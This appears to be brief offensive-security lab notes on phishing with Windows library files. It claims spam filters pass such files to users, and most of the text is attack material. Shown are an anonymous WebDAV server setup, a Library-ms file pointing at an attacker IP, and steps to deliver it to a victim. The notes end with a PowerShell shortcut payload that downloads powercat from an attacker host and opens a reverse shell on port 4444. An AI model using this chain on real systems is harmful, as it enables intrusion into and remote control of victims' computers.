majority of spam filters and other security controls will directly pass windows library files directly to user

```
pip3 install wsgidav

mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/


```

#### config.Library-ms

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

copy library ms file to victim machine

create shortcut with powershell and place in webdav directory

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8000/powercat.ps1');
powercat -c 192.168.45.158 -p 4444 -e powershell"
```